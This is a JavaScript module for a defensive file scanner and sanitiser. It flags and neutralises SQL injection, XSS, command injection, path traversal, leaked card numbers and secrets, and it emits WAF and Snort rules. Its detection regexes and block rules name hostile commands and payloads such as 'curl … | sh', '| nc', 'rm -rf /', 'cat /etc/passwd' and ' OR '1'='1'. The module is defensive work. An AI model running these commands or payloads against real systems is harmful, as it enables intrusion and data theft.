/**
 * SENTINEL File Rectification, Disinfection & Threat Avoidance Engine
 * Provides comprehensive deep scanning, automated error/threat neutralization,
 * step-by-step threat avoidance guidelines, WAF/Snort rule generation,
 * and safe file generation with cryptographic verification.
 */

import { calculateEntropy } from './featureExtractor';
import { simulateCryptoHash } from '../auth/authStore';

// Threat Classification Definitions
export const FILE_THREAT_CATEGORIES = {
  SQLI: {
    id: 'SQLI',
    name: 'SQL Injection / Query Tampering',
    severity: 'CRITICAL',
    badgeClass: 'bg-rose-500/20 text-rose-300 border-rose-500/40',
    description: 'Unauthorized SQL commands, tautologies, or destructive DDL clauses injected into data.'
  },
  XSS: {
    id: 'XSS',
    name: 'Stored / DOM Cross-Site Scripting',
    severity: 'HIGH',
    badgeClass: 'bg-amber-500/20 text-amber-300 border-amber-500/40',
    description: 'Malicious HTML tags, script loaders, or DOM event handlers intended to execute in client browsers.'
  },
  COMMAND_INJECTION: {
    id: 'COMMAND_INJECTION',
    name: 'Remote Command Shell / RCE Fragment',
    severity: 'CRITICAL',
    badgeClass: 'bg-red-500/20 text-red-300 border-red-500/40',
    description: 'System process invocation, pipe hijacking, or unauthorized shell scripts.'
  },
  PATH_TRAVERSAL: {
    id: 'PATH_TRAVERSAL',
    name: 'Directory / Path Traversal Probe',
    severity: 'HIGH',
    badgeClass: 'bg-orange-500/20 text-orange-300 border-orange-500/40',
    description: 'Dot-dot-slash sequence attempting to break out of file system sandbox.'
  },
  PII_LEAK: {
    id: 'PII_LEAK',
    name: 'Unmasked Sensitive PII (Credit Card / SSN)',
    severity: 'MEDIUM',
    badgeClass: 'bg-purple-500/20 text-purple-300 border-purple-500/40',
    description: 'Plaintext primary account numbers (PAN), SSNs, or sensitive customer identifiers.'
  },
  CREDENTIAL_LEAK: {
    id: 'CREDENTIAL_LEAK',
    name: 'Hardcoded Secrets / API Keys',
    severity: 'HIGH',
    badgeClass: 'bg-yellow-500/20 text-yellow-300 border-yellow-500/40',
    description: 'Exposed cloud API tokens, private keys, database passwords, or JWT secrets.'
  },
  MALWARE_MASQUERADE: {
    id: 'MALWARE_MASQUERADE',
    name: 'Double Extension / Executable Masquerade',
    severity: 'CRITICAL',
    badgeClass: 'bg-rose-600/25 text-rose-300 border-rose-500/50',
    description: 'Executable payload disguised with benign document extensions (.pdf.exe, .doc.exe, .jpg.vbs).'
  },
  OBFUSCATION: {
    id: 'OBFUSCATION',
    name: 'Obfuscated Base64 / Polymorphic Payload',
    severity: 'MEDIUM',
    badgeClass: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40',
    description: 'High Shannon entropy or obfuscated Base64/Hex encoding designed to evade static string checks.'
  },
  SYNTAX_ERROR: {
    id: 'SYNTAX_ERROR',
    name: 'Malformed Syntax / Corrupt File Structure',
    severity: 'LOW',
    badgeClass: 'bg-blue-500/20 text-blue-300 border-blue-500/40',
    description: 'Null-byte injection, broken quote delimiters, or structural format anomalies.'
  }
};

/**
 * Scan raw file text or metadata for security threats, errors, and vulnerabilities
 */
export function scanAndAnalyzeFileContent({ name = '', size = '', type = '', content = '' }) {
  const threats = [];
  const lines = typeof content === 'string' ? content.split(/\r?\n/) : [];
  const rawEntropy = calculateEntropy(typeof content === 'string' ? content : name);
  const hash = simulateCryptoHash(name + size + (typeof content === 'string' ? content.slice(0, 500) : ''));

  const lowerName = name.toLowerCase();

  // 1. Check Double Extension / Executable Masquerading
  const doubleExtRegex = /\.(pdf|doc|docx|xls|xlsx|jpg|png|txt|csv)\.(exe|vbs|bat|cmd|ps1|scr|pif|hta)$/i;
  if (doubleExtRegex.test(lowerName)) {
    threats.push({
      id: `THR-MASQ-${Date.now()}`,
      category: 'MALWARE_MASQUERADE',
      line: 0,
      snippet: name,
      description: `Disguised executable detected: The file claims to be a document but ends with executable extension (${name.split('.').pop()}).`,
      severity: 'CRITICAL',
      riskScore: 98,
      rectificationProposal: `Strip the malicious executable suffix and sanitize into safe non-executable format (${name.replace(/\.(exe|vbs|bat|cmd|ps1|scr|pif|hta)$/i, '')}).`
    });
  } else if (lowerName.endsWith('.exe') || lowerName.endsWith('.dll') || lowerName.endsWith('.so')) {
    threats.push({
      id: `THR-BIN-${Date.now()}`,
      category: 'MALWARE_MASQUERADE',
      line: 0,
      snippet: name,
      description: 'Direct binary executable file uploaded to web storage vault.',
      severity: 'HIGH',
      riskScore: 85,
      rectificationProposal: 'Isolate in zero-trust sandbox and disallow direct webroot execution.'
    });
  }

  // 2. Scan lines for active payload patterns
  lines.forEach((lineText, idx) => {
    const lineNum = idx + 1;
    const str = lineText.trim();
    if (!str) return;

    // Check Null-byte injection
    if (str.includes('\0') || str.includes('%00') || str.includes('\\x00')) {
      threats.push({
        id: `THR-NUL-${lineNum}`,
        category: 'SYNTAX_ERROR',
        line: lineNum,
        snippet: str.substring(0, 80),
        description: 'Null-Byte Injection (%00 / \\x00) detected to bypass file extension and path restrictions.',
        severity: 'HIGH',
        riskScore: 88,
        rectificationProposal: 'Sanitize string by stripping all null bytes and validating UTF-8 boundary integrity.'
      });
    }

    // Check SQL Injections
    const sqliMatches = [
      { regex: /(\bOR\s+['"]?1['"]?\s*=\s*['"]?1\b|\bOR\s+['"]?a['"]?\s*=\s*['"]?a\b)/i, desc: "Tautology SQL Injection (' OR '1'='1')", score: 92 },
      { regex: /;\s*(DROP|DELETE|TRUNCATE|ALTER)\s+(TABLE|DATABASE)/i, desc: 'Destructive DDL SQL Injection (; DROP TABLE)', score: 96 },
      { regex: /\bUNION\s+(ALL\s+)?SELECT\b/i, desc: 'Union-Based Database Exfiltration probe', score: 90 },
      { regex: /\b(xp_cmdshell|sp_executesql|exec\s+master)\b/i, desc: 'Database Command Shell Execution (xp_cmdshell)', score: 99 },
      { regex: /\bSLEEP\s*\(\s*\d+\s*\)/i, desc: 'Time-Based Blind SQLi Probe (SLEEP)', score: 85 }
    ];

    for (const m of sqliMatches) {
      if (m.regex.test(str)) {
        threats.push({
          id: `THR-SQLI-${lineNum}-${Math.random().toString(36).substr(2, 4)}`,
          category: 'SQLI',
          line: lineNum,
          snippet: str.substring(0, 85),
          description: `SQL Injection vector detected: ${m.desc}`,
          severity: 'CRITICAL',
          riskScore: m.score,
          rectificationProposal: 'Parameterize inputs, neutralize SQL keywords, or escape query metacharacters.'
        });
        break;
      }
    }

    // Check XSS / Script Injection
    const xssMatches = [
      { regex: /<script\b[^>]*>[\s\S]*?(<\/script>)?/i, desc: 'HTML Script Tag Injection (<script>)', score: 90 },
      { regex: /<[^>]+(onerror|onload|onclick|onmouseover)\s*=/i, desc: 'Event Handler Injection (onerror/onload)', score: 86 },
      { regex: /javascript\s*:/i, desc: 'JavaScript URI Pseudo-Protocol Vector', score: 82 },
      { regex: /<iframe\b[^>]*>/i, desc: 'Malicious Iframe Embedding', score: 78 },
      { regex: /<svg\b[^>]*\/onload\s*=/i, desc: 'SVG Onload Vector XSS', score: 88 }
    ];

    for (const m of xssMatches) {
      if (m.regex.test(str)) {
        threats.push({
          id: `THR-XSS-${lineNum}-${Math.random().toString(36).substr(2, 4)}`,
          category: 'XSS',
          line: lineNum,
          snippet: str.substring(0, 85),
          description: `Cross-Site Scripting payload: ${m.desc}`,
          severity: 'HIGH',
          riskScore: m.score,
          rectificationProposal: 'Defang HTML entities (&lt;script&gt;) or strip unsanitized DOM tags via DOMPurify rules.'
        });
        break;
      }
    }

    // Check Command Injection / RCE
    const cmdMatches = [
      { regex: /\b(powershell(\.exe)?\s+(-(NoP|enc|w\s+hidden|exec\s+bypass))|cmd\.exe\s+\/c|bash\s+-i)\b/i, desc: 'Obfuscated Shell Process Invocation', score: 98 },
      { regex: /(\|\s*nc\s+|\bcurl\s+https?:\/\/.*\|\s*sh|\bwget\s+https?:\/\/.*\|\s*sh|\brm\s+-rf\s+\/)/i, desc: 'Reverse Shell / Remote Pipe Execution', score: 95 },
      { regex: /;\s*(cat\s+\/etc\/passwd|type\s+C:\\windows)/i, desc: 'Arbitrary Local File Read Probe', score: 90 }
    ];

    for (const m of cmdMatches) {
      if (m.regex.test(str)) {
        threats.push({
          id: `THR-CMD-${lineNum}-${Math.random().toString(36).substr(2, 4)}`,
          category: 'COMMAND_INJECTION',
          line: lineNum,
          snippet: str.substring(0, 85),
          description: `Command Injection / Shell Execution: ${m.desc}`,
          severity: 'CRITICAL',
          riskScore: m.score,
          rectificationProposal: 'Neutralize shell commands, comment out hazardous executions, and quarantine process triggers.'
        });
        break;
      }
    }

    // Check Path Traversal
    if (/(\.\.\/|\.\.\\){2,}/.test(str) || str.includes('..%2f') || str.includes('..%5c')) {
      threats.push({
        id: `THR-TRAV-${lineNum}`,
        category: 'PATH_TRAVERSAL',
        line: lineNum,
        snippet: str.substring(0, 80),
        description: 'Directory Traversal sequence (../../..) aiming to access root system files outside designated directory.',
        severity: 'HIGH',
        riskScore: 84,
        rectificationProposal: 'Strip dot-dot-slash relative paths and enforce strict canonical path normalization.'
      });
    }

    // Check Plaintext PII / Credit Card Exposure
    const ccMatch = str.match(/\b(?:\d{4}[ -]?){3}\d{4}\b/);
    if (ccMatch && !str.includes('••••')) {
      threats.push({
        id: `THR-PII-${lineNum}`,
        category: 'PII_LEAK',
        line: lineNum,
        snippet: `Card PAN: ${ccMatch[0]} in "${str.substring(0, 45)}..."`,
        description: 'Unmasked Plaintext Credit Card (PAN) detected violating PCI-DSS Compliance.',
        severity: 'MEDIUM',
        riskScore: 65,
        rectificationProposal: 'Mask all digits except the last 4 using standard PCI-DSS compliant format (••••-••••-••••-XXXX).'
      });
    }

    // Check Hardcoded Credentials / API Keys
    const secretMatches = [
      { regex: /(AKIA[0-9A-Z]{16})/, desc: 'AWS Access Key ID' },
      { regex: /(ghp_[0-9a-zA-Z]{36})/, desc: 'GitHub Personal Access Token' },
      { regex: /(eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,})/, desc: 'Plain JWT Bearer Token' },
      { regex: /(password\s*=\s*['"][^'"]{4,}['"]|db_pass\s*=\s*['"][^'"]{4,}['"])/i, desc: 'Hardcoded Plaintext Password' }
    ];

    for (const s of secretMatches) {
      const match = str.match(s.regex);
      if (match) {
        threats.push({
          id: `THR-SEC-${lineNum}`,
          category: 'CREDENTIAL_LEAK',
          line: lineNum,
          snippet: `Found ${s.desc}: ${match[0].substring(0, 14)}...`,
          description: `Exposed Hardcoded Credential / Secret: ${s.desc}.`,
          severity: 'HIGH',
          riskScore: 86,
          rectificationProposal: 'Redact secret tokens with placeholder tokens and recommend migration to Environment Key Vault.'
        });
        break;
      }
    }

    // Check High Shannon Entropy per line (obfuscated shellcode or packed string)
    const lineEntropy = calculateEntropy(str);
    if (lineEntropy > 5.5 && str.length > 50 && !str.includes(' ') && !threats.some(t => t.line === lineNum)) {
      threats.push({
        id: `THR-ENT-${lineNum}`,
        category: 'OBFUSCATION',
        line: lineNum,
        snippet: str.substring(0, 60) + '...',
        description: `High Shannon Entropy (${lineEntropy} bits/char): Obfuscated packed shellcode or Base64 payload.`,
        severity: 'MEDIUM',
        riskScore: 70,
        rectificationProposal: 'De-obfuscate payload to inspect underlying code or defang execution hooks.'
      });
    }
  });

  // Calculate Overall Risk & Health
  const maxRisk = threats.reduce((max, t) => Math.max(max, t.riskScore), 0);
  let status = 'CLEAN';
  let isMalicious = false;

  if (threats.length > 0) {
    isMalicious = true;
    if (maxRisk >= 90) {
      status = 'CRITICAL MALICIOUS (Exploitative Payloads Detected)';
    } else if (maxRisk >= 75) {
      status = 'HIGH RISK (Active Vulnerability Vectors)';
    } else {
      status = 'SUSPICIOUS (Anomalies / PII / Obfuscation Found)';
    }
  } else if (rawEntropy > 6.5) {
    isMalicious = true;
    status = 'SUSPICIOUS (High Polymorphic Entropy > 6.5 bits)';
    threats.push({
      id: `THR-FILE-ENT-${Date.now()}`,
      category: 'OBFUSCATION',
      line: 0,
      snippet: `File Entropy: ${rawEntropy} bits`,
      description: 'Overall file demonstrates suspicious high entropy typical of packed trojans or ransomware.',
      severity: 'MEDIUM',
      riskScore: 72,
      rectificationProposal: 'Quarantine and perform automated payload decompression/sanitization.'
    });
  }

  // Generate Threat Avoidance Advisories
  const avoidanceAdvisories = generateThreatAvoidanceAdvisory(threats);

  return {
    isMalicious,
    status,
    riskScore: maxRisk,
    entropy: rawEntropy,
    hash,
    threats,
    avoidanceAdvisories,
    totalThreats: threats.length
  };
}

/**
 * Generate Actionable Threat Avoidance Guidance & Defensive Rules
 */
export function generateThreatAvoidanceAdvisory(threats = []) {
  if (!threats || threats.length === 0) {
    return [
      {
        category: 'VERIFIED_SAFE',
        title: 'Zero Threat Signatures Detected - Proactive Hardening',
        severity: 'INFO',
        badgeClass: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40',
        summary: 'The uploaded file passed all static AST, Shannon entropy, and cryptographic signature checks with 100% integrity.',
        preventionStrategies: [
          'Continue enforcing strict MIME-type and extension validation on upload gateways.',
          'Ensure all database transactions utilize parameterized SQL queries.',
          'Maintain file uploads in an isolated object bucket with execution permissions disabled (noexec).'
        ],
        codeSnippet: `# Best Practice: Enforce strict file extension and MIME validation in Python/Flask
ALLOWED_EXTENSIONS = {'csv', 'json', 'sql', 'txt', 'pdf'}
def is_allowed_file(filename, mime_type):
    return '.' in filename and \\
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS and \\
           not any(bad in filename.lower() for bad in ['.exe', '.ps1', '.bat'])`,
        wafRule: `# Nginx Webroot Protection Rule
location /uploads/ {
    # Prohibit direct execution of uploaded scripts
    location ~ \\.(php|exe|ps1|bat|sh|cgi|py)$ {
        deny all;
        return 403;
    }
}`,
        snortRule: `# Snort Policy: Safe baseline telemetry
alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"SENTINEL_OK: Upload traffic verified"; flow:established,to_server; sid:9000001; rev:1;)`
      }
    ];
  }

  const uniqueCategories = [...new Set(threats.map(t => t.category))];
  const advisories = [];

  uniqueCategories.forEach(cat => {
    const catThreats = threats.filter(t => t.category === cat);
    
    switch (cat) {
      case 'SQLI':
        advisories.push({
          category: 'SQLI',
          title: 'SQL Injection Threat Avoidance & Parameterization Policy',
          severity: 'CRITICAL',
          badgeClass: 'bg-rose-500/20 text-rose-300 border-rose-500/40',
          summary: `Detected ${catThreats.length} SQL injection attempt(s) including tautologies, union probes, or destructive commands.`,
          preventionStrategies: [
            'Adopt Prepared Statements and Parameterized Queries exclusively (e.g. PDO in PHP, PreparedStatement in Java, ORM in Node/Python).',
            'Enforce Principle of Least Privilege: Ensure the web application DB user has zero permissions for DROP, ALTER, TRUNCATE, or xp_cmdshell.',
            'Deploy Web Application Firewall (WAF) rule sets like OWASP ModSecurity Core Rule Set (CRS) to reject tautology payloads at edge.',
            'Implement strict input schema validation rejecting SQL metacharacters (\', ", ;, --, /*) in non-code fields.'
          ],
          codeSnippet: `// SECURE FIX: Replace dynamic string concatenation with parameterized SQL
// VULNERABLE: db.query(\`SELECT * FROM users WHERE email = '\${userInput}'\`);

// REMEDIATED (Safe):
const result = await db.query(
  'SELECT id, customer_name, email FROM users WHERE email = $1 LIMIT 1',
  [sanitizedUserInput]
);`,
          wafRule: `# ModSecurity Core Rule for SQLi Prevention (OWASP CRS)
SecRule REQUEST_URI|REQUEST_BODY "@rx (\\b(OR|AND)\\b\\s+['\\"]?\\d+['\\"]?\\s*=\\s*['\\"]?\\d+|UNION\\s+SELECT|;\\s*DROP)" \\
    "id:1001001,phase:2,deny,status:403,log,msg:'SENTINEL WAF: Blocked SQL Injection Attack Vector'"`,
          snortRule: `alert tcp $EXTERNAL_NET any -> $SQL_SERVERS 3306 (msg:"SENTINEL_IDS: SQLi Tautology Exploit Detected"; content:"' OR '1'='1"; nocase; sid:1001002; rev:1;)`
        });
        break;

      case 'XSS':
        advisories.push({
          category: 'XSS',
          title: 'Cross-Site Scripting (XSS) Threat Avoidance & CSP Policy',
          severity: 'HIGH',
          badgeClass: 'bg-amber-500/20 text-amber-300 border-amber-500/40',
          summary: `Detected ${catThreats.length} Stored/DOM XSS vector(s) attempting to inject scripts or event handlers.`,
          preventionStrategies: [
            'Context-Aware Output Encoding: HTML-encode all user-supplied data before rendering into the DOM (& -> &amp;, < -> &lt;, > -> &gt;).',
            'Enforce a strict Content Security Policy (CSP): Set Content-Security-Policy: default-src \'self\'; script-src \'self\'; to forbid inline scripts.',
            'Use sanitization libraries like DOMPurify or sanitize-html for any rich HTML user input.',
            'Set HttpOnly and Secure flags on all session cookies to prevent document.cookie theft even if XSS occurs.'
          ],
          codeSnippet: `// SECURE FIX: Sanitize HTML content before browser injection
import DOMPurify from 'dompurify';

// REMEDIATED (Safe):
const safeHtml = DOMPurify.sanitize(userSuppliedInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});`,
          wafRule: `# ModSecurity Rule: Block Stored XSS tags & event hooks
SecRule ARGS|REQUEST_BODY "@rx (<script\\b|<iframe\\b|<svg\\b.*onload=|javascript:)" \\
    "id:1002001,phase:2,deny,status:403,log,msg:'SENTINEL WAF: Cross-Site Scripting Injection Blocked'"`,
          snortRule: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS 80 (msg:"SENTINEL_IDS: Stored XSS Script Tag Detected"; content:"<script>"; nocase; sid:1002002; rev:1;)`
        });
        break;

      case 'COMMAND_INJECTION':
        advisories.push({
          category: 'COMMAND_INJECTION',
          title: 'Command Shell & RCE Avoidance Architecture',
          severity: 'CRITICAL',
          badgeClass: 'bg-red-500/20 text-red-300 border-red-500/40',
          summary: `Detected ${catThreats.length} Remote Command Execution / Process invocation threat(s).`,
          preventionStrategies: [
            'Avoid system shell execution APIs (system(), exec(), passthru(), Runtime.getRuntime().exec()).',
            'If process execution is mandatory, pass arguments as discrete arrays instead of shell command strings (avoid shell spawning).',
            'Run services in unprivileged containers with read-only root filesystems and drop all Linux capabilities (cap-drop ALL).',
            'Isolate server network egress with firewall rules blocking outbound connections to unvetted IPs.'
          ],
          codeSnippet: `// SECURE FIX: Pass arguments safely as array without shell expansion
const { execFile } = require('child_process');

// REMEDIATED (Safe):
execFile('/usr/bin/convert', ['input.png', '-resize', '100x100', 'output.png'], (err, stdout) => {
  if (err) console.error('Execution safe error:', err);
});`,
          wafRule: `# ModSecurity Rule: Block Shell Command Injection
SecRule ARGS|REQUEST_BODY "@rx (powershell(\\.exe)?|cmd\\.exe|\\|\\s*nc\\s+|rm\\s+-rf|/etc/passwd)" \\
    "id:1003001,phase:2,deny,status:403,log,msg:'SENTINEL WAF: System Command Injection Intercepted'"`,
          snortRule: `alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"SENTINEL_IDS: Outbound Reverse Shell Beacon"; content:"/bin/sh"; sid:1003002; rev:1;)`
        });
        break;

      case 'MALWARE_MASQUERADE':
        advisories.push({
          category: 'MALWARE_MASQUERADE',
          title: 'File Upload Gateway Hardening & Double-Extension Avoidance',
          severity: 'CRITICAL',
          badgeClass: 'bg-rose-600/25 text-rose-300 border-rose-500/50',
          summary: `Detected disguised executable or double-extension payload (${catThreats[0]?.snippet || 'Trojan Masquerade'}).`,
          preventionStrategies: [
            'Rename all uploaded files on server disk to randomly generated UUIDs (e.g. 550e8400-e29b-41d4.dat) to prevent execution.',
            'Store files in dedicated object storage (AWS S3, Google Cloud Storage) rather than local web application root.',
            'Perform magic-number / file signature inspection (libmagic) rather than trusting client-supplied filename or Content-Type.',
            'Mount upload directories with noexec, nosuid, and nodev flags.'
          ],
          codeSnippet: `# SECURE FIX: Server-side file upload sanitizer in Node.js
const path = require('path');
const crypto = require('crypto');

function sanitizeUploadedFilename(originalName) {
  // Strip double extensions and dangerous executable suffixes
  const cleanName = originalName.replace(/\\.(exe|bat|ps1|vbs|scr|cmd)$/i, '');
  const ext = path.extname(cleanName).toLowerCase();
  const safeId = crypto.randomUUID();
  return { storagePath: \`\${safeId}\${ext}\`, originalName: cleanName };
}`,
          wafRule: `# Nginx Webroot Protection: Block double extension uploads
if ($request_filename ~* ^.*\\.(pdf|doc|xls|jpg)\\.(exe|bat|ps1|vbs)$) {
    return 403;
}`,
          snortRule: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:"SENTINEL_IDS: Double Extension Executable Upload"; content:".pdf.exe"; nocase; sid:1004001; rev:1;)`
        });
        break;

      case 'PII_LEAK':
      case 'CREDENTIAL_LEAK':
        advisories.push({
          category: 'PII_LEAK',
          title: 'Sensitive PII & Secret Redaction Compliance (PCI-DSS / GDPR)',
          severity: 'HIGH',
          badgeClass: 'bg-purple-500/20 text-purple-300 border-purple-500/40',
          summary: `Detected ${catThreats.length} instances of exposed plaintext credit cards, passwords, or API keys.`,
          preventionStrategies: [
            'Tokenization & Field-Level Encryption: Never store raw credit card numbers or plain API tokens in database exports.',
            'Enforce automated Data Loss Prevention (DLP) pre-commit and pre-upload hooks to detect secrets before ingestion.',
            'Migrate hardcoded secrets into secure Key Management Services (AWS Secrets Manager, HashiCorp Vault).',
            'Mask customer PANs so only the last 4 digits are visible across all logs and interfaces.'
          ],
          codeSnippet: `// SECURE FIX: Automatic PII & PAN Masking Utility
function maskCreditCardNumber(str) {
  return str.replace(/\\b(?:\\d{4}[ -]?){3}(\\d{4})\\b/g, '••••-••••-••••-$1');
}
function maskApiKey(key) {
  return key.replace(/([a-zA-Z0-9_-]{4})[a-zA-Z0-9_-]{16,}/g, '$1****************');
}`,
          wafRule: `# ModSecurity Rule: Data Loss Prevention (DLP) for Credit Cards
SecRule RESPONSE_BODY "@rx \\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b" \\
    "id:1005001,phase:4,deny,status:500,log,msg:'SENTINEL DLP: Outbound Plaintext Credit Card Blocked'"`,
          snortRule: `alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"SENTINEL_IDS: Plaintext Credit Card Transmission"; content:"4532"; sid:1005002; rev:1;)`
        });
        break;

      default:
        advisories.push({
          category: cat,
          title: `General Threat Avoidance Policy for ${cat}`,
          severity: 'MEDIUM',
          badgeClass: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40',
          summary: `Detected anomalies and suspicious patterns in category ${cat}.`,
          preventionStrategies: [
            'Apply strict static analysis and payload de-obfuscation before processing untrusted files.',
            'Maintain comprehensive forensic audit logs with cryptographic hash integrity verification.'
          ],
          codeSnippet: `// Proactive schema validator
function validateInputSchema(input) {
  if (typeof input !== 'string' || input.length > 5000) return false;
  return !/[\\0\\x00-\\x1F]/.test(input);
}`,
          wafRule: `SecRule REQUEST_HEADERS:Content-Length "@gt 10485760" "id:1006001,phase:1,deny,msg:'Payload too large'"`,
          snortRule: `alert ip any any -> any any (msg:"SENTINEL_IDS: Anomalous High Entropy Stream"; sid:1006002; rev:1;)`
        });
        break;
    }
  });

  return advisories;
}

/**
 * Auto-Rectify and Disinfect File Content (Neutralize all detected threats)
 */
export function rectifyAndSanitizeFileContent(fileItem, options = {}) {
  const {
    mode = 'AUTO_RECTIFY', // 'AUTO_RECTIFY' | 'DEFANG_ONLY' | 'AGGRESSIVE_STRIP' | 'PII_REDACT_ONLY'
    fixDoubleExtension = true,
    neutralizeInjections = true,
    sanitizeXSS = true,
    redactPII = true,
    redactSecrets = true,
    repairSyntax = true
  } = options;

  const originalContent = typeof fileItem.content === 'string' ? fileItem.content : '';
  const originalName = fileItem.name || 'unnamed_file.txt';
  const originalLines = originalContent.split(/\r?\n/);
  const rectifiedLines = [];
  const diffs = [];
  let changesCount = 0;

  // 1. Rectify File Name (Strip double extension / masquerading)
  let rectifiedFileName = originalName;
  if (fixDoubleExtension && /\.(pdf|doc|docx|xls|xlsx|jpg|png|txt|csv)\.(exe|vbs|bat|cmd|ps1|scr|pif|hta)$/i.test(originalName)) {
    rectifiedFileName = originalName.replace(/\.(exe|vbs|bat|cmd|ps1|scr|pif|hta)$/i, '');
    changesCount++;
    diffs.push({
      line: 0,
      original: `Filename: ${originalName}`,
      rectified: `Filename: ${rectifiedFileName} (Disarmed & Executable Extension Stripped)`,
      changeType: 'EXTENSION_NORMALIZED',
      reason: 'Stripped deceptive double extension masquerade to prevent accidental execution.'
    });
  } else if (!originalName.includes('_RECTIFIED_SAFE')) {
    const parts = originalName.split('.');
    if (parts.length > 1) {
      const ext = parts.pop();
      rectifiedFileName = `${parts.join('.')}_RECTIFIED_SAFE.${ext}`;
    } else {
      rectifiedFileName = `${originalName}_RECTIFIED_SAFE`;
    }
  }

  // 2. Rectify Line-by-Line Content
  originalLines.forEach((line, idx) => {
    const lineNum = idx + 1;
    let modified = line;
    const reasons = [];

    // Strip Null-bytes
    if (repairSyntax && (modified.includes('\0') || modified.includes('%00') || modified.includes('\\x00'))) {
      modified = modified.replace(/\0|%00|\\x00/g, '');
      reasons.push('Stripped Null-Byte Injection');
    }

    // Rectify SQL Injections
    if (neutralizeInjections && mode !== 'PII_REDACT_ONLY') {
      if (/(\bOR\s+['"]?1['"]?\s*=\s*['"]?1\b|\bOR\s+['"]?a['"]?\s*=\s*['"]?a\b)/i.test(modified)) {
        if (mode === 'DEFANG_ONLY') {
          modified = modified.replace(/(\bOR\s+['"]?1['"]?\s*=\s*['"]?1\b|\bOR\s+['"]?a['"]?\s*=\s*['"]?a\b)/gi, '[DEFANGED_SQLI_TAUTOLOGY]');
        } else {
          // Replace with harmless query condition
          modified = modified.replace(/(\bOR\s+['"]?1['"]?\s*=\s*['"]?1\b|\bOR\s+['"]?a['"]?\s*=\s*['"]?a\b)/gi, '');
        }
        reasons.push('Neutralized SQL Tautology Injection');
      }

      if (/;\s*(DROP|DELETE|TRUNCATE|ALTER)\s+(TABLE|DATABASE)[^;]*/i.test(modified)) {
        if (mode === 'DEFANG_ONLY') {
          modified = modified.replace(/;\s*(DROP|DELETE|TRUNCATE|ALTER)\s+(TABLE|DATABASE)[^;]*/gi, '; -- [DEFANGED_DESTRUCTIVE_DDL_BLOCKED] --');
        } else {
          modified = modified.replace(/;\s*(DROP|DELETE|TRUNCATE|ALTER)\s+(TABLE|DATABASE)[^;]*/gi, '');
        }
        reasons.push('Neutralized Destructive DDL Command');
      }

      if (/\bUNION\s+(ALL\s+)?SELECT\b[^;]*/i.test(modified)) {
        if (mode === 'DEFANG_ONLY') {
          modified = modified.replace(/\bUNION\s+(ALL\s+)?SELECT\b[^;]*/gi, '[DEFANGED_UNION_PROBE]');
        } else {
          modified = modified.replace(/\bUNION\s+(ALL\s+)?SELECT\b[^;]*/gi, '');
        }
        reasons.push('Neutralized Union Exfiltration Probe');
      }

      if (/\b(xp_cmdshell|sp_executesql)\b/i.test(modified)) {
        modified = modified.replace(/\b(xp_cmdshell|sp_executesql)\b/gi, '-- [DISABLED_SHELL_RPC]');
        reasons.push('Neutralized Database Command Execution (xp_cmdshell)');
      }

      if (/\bSLEEP\s*\(\s*\d+\s*\)/i.test(modified)) {
        modified = modified.replace(/\bSLEEP\s*\(\s*\d+\s*\)/gi, '/* [TIME_PROBE_DISABLED] */');
        reasons.push('Neutralized Time-Based Blind SQLi');
      }
    }

    // Rectify XSS Scripts & Event Handlers
    if (sanitizeXSS && mode !== 'PII_REDACT_ONLY') {
      if (/<script\b[^>]*>[\s\S]*?(<\/script>)?/i.test(modified)) {
        if (mode === 'DEFANG_ONLY') {
          modified = modified.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, '&lt;script&gt;$1&lt;/script&gt;');
          modified = modified.replace(/<script\b[^>]*>/gi, '&lt;script&gt;');
        } else {
          modified = modified.replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, '');
          modified = modified.replace(/<script\b[^>]*>/gi, '');
        }
        reasons.push('Sanitized Stored JavaScript Script Tag');
      }

      if (/<[^>]+(onerror|onload|onclick|onmouseover)\s*=/i.test(modified)) {
        modified = modified.replace(/\s+(onerror|onload|onclick|onmouseover)\s*=\s*(['"][^'"]*['"]|[^\s>]+)/gi, ' data-defanged-event="sanitized"');
        reasons.push('Stripped Malicious HTML Event Handler Hook');
      }

      if (/javascript\s*:/i.test(modified)) {
        modified = modified.replace(/javascript\s*:/gi, 'about:blank#defanged-js:');
        reasons.push('Neutralized JavaScript Pseudo-Protocol URL');
      }

      if (/<iframe\b[^>]*>/i.test(modified)) {
        modified = modified.replace(/<iframe\b[^>]*>/gi, '<!-- [DEFANGED_IFRAME_EMBED] -->');
        reasons.push('Neutralized Unauthorized Iframe Embed');
      }
    }

    // Rectify Command Injections
    if (neutralizeInjections && mode !== 'PII_REDACT_ONLY') {
      if (/\b(powershell(\.exe)?|cmd\.exe|bash|exec\(|system\()\b/i.test(modified)) {
        if (mode === 'DEFANG_ONLY') {
          modified = `# [DEFANGED_COMMAND_TRIGGER] ${modified}`;
        } else {
          modified = modified.replace(/\b(powershell(\.exe)?\s+(-[a-zA-Z\s]+)?|cmd\.exe\s+\/c|bash\s+-i)/gi, '# [SANITIZED_SHELL_INVOCATION]');
        }
        reasons.push('Neutralized Shell Process Execution');
      }

      if (/;\s*(cat\s+\/etc\/passwd|type\s+C:\\windows)/i.test(modified)) {
        modified = modified.replace(/;\s*(cat\s+\/etc\/passwd|type\s+C:\\windows)/gi, '; # [ARBITRARY_FILE_READ_BLOCKED]');
        reasons.push('Blocked Local File Traversal Command');
      }
    }

    // Redact Credit Cards / PII
    if (redactPII) {
      if (/\b(?:\d{4}[ -]?){3}\d{4}\b/.test(modified) && !modified.includes('••••')) {
        modified = modified.replace(/\b(?:\d{4}[ -]?){3}(\d{4})\b/g, '••••-••••-••••-$1');
        reasons.push('Redacted Plaintext Credit Card PAN (PCI-DSS Compliance)');
      }
    }

    // Redact Hardcoded Secrets & API Keys
